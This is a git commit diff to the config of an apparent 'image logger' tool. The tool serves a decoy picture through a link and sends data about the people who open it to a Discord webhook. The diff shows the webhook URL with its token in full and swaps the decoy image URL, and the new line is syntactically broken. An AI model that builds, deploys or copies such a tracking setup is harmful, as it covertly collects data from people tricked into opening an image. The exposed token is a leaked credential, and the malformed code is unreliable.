6253f02b87cb8b2f8403e2989b9089943d339a91
kylegmojica-maker <kylegmojica@gmail.com>
2026-07-15 22:36:06 +0800

    Update image.py

--- api/image.py
+++ api/image.py
@@ -15,7 +15,7 @@ __author__ = "fishyramen"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1526944032557633614/ogT8cHe8z1lICCccGbuJbvBtpS0Hx4rkYmLIZHAdUZbI6aRxAsuQEl76yuu-hgBhxK-k",
-    "image": "https://moewalls.com/wp-content/uploads/2023/04/bliss-windows-xp-thumb.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
